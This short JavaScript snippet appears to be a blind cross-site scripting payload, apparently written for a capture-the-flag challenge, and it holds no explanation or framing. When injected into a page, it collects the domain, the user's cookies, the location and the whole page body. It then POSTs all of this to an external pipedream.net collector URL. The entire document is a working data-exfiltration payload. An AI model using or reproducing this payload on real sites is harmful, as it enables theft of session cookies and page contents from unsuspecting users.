  const headers = new Headers()
headers.append("Content-Type", "application/json")

let flag = ""

const body = {
  "test": "Blind",
  "Domain": document.domain,
  "cookie": document.cookie,
  "Location": document.location,
  "flag":document.body
  
}

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://eolimcwppmmjo1s.m.pipedream.net", options)
